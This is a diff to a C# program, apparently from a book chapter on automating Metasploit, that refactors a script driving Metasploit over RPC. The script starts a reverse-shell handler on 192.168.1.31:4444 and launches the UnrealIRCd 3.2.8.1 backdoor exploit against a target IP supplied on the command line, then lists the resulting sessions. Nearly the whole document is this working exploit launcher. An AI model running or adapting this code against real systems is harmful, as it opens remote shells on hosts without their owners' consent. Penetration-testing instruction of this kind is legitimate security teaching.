@@ -11,28 +11,29 @@ namespace ch13_automating_metasploit
 				if (string.IsNullOrEmpty (session.Token))
 					throw new Exception ("Login failed. Check credentials");
 
+				string listenAddr = "192.168.1.31";
+				int listenPort = 4444;
+				string payload = "cmd/unix/reverse";
 				using (MetasploitManager manager = new MetasploitManager (session)) {
 					Dictionary<string, object> response = null;
 
 					Dictionary<string, object> blah = new Dictionary<string, object> ();
-					blah ["ExitOnSession"] = "false";
-					blah ["PAYLOAD"] = "cmd/unix/reverse";
-					blah ["LHOST"] = "192.168.1.31";
-					blah ["LPORT"] = "4444";
+					blah ["ExitOnSession"] = false;
+					blah ["PAYLOAD"] = payload;
+					blah ["LHOST"] = listenAddr;
+					blah ["LPORT"] = listenPort;
 
 					response = manager.ExecuteModule ("exploit", "multi/handler", blah);
 					object jobID = response ["job_id"];
 
-					foreach (string ip in args) {
-						Dictionary<string, object> opts = new Dictionary<string, object> ();
-						opts ["RHOST"] = ip;
-						opts ["DisablePayloadHandler"] = "true";
-						opts ["LHOST"] = "192.168.1.31";
-						opts ["LPORT"] = "4444";
-						opts ["PAYLOAD"] = "cmd/unix/reverse";
+					Dictionary<string, object> opts = new Dictionary<string, object> ();
+					opts ["RHOST"] = args[0];
+					opts ["DisablePayloadHandler"] = true;
+					opts ["LHOST"] = listenAddr;
+					opts ["LPORT"] = listenPort;
+					opts ["PAYLOAD"] = payload;
 
-						response = manager.ExecuteModule ("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);
-					}
+					response = manager.ExecuteModule ("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);
 
 					response = manager.ListJobs ();
 					List<object> vals = new List<object> (response.Values);
@@ -42,7 +43,6 @@ namespace ch13_automating_metasploit
 						response = manager.ListJobs ();
 						vals = new List<object> (response.Values);
 					}
-
 
 					response = manager.StopJob (jobID.ToString ());
 					response = manager.ListSessions ();
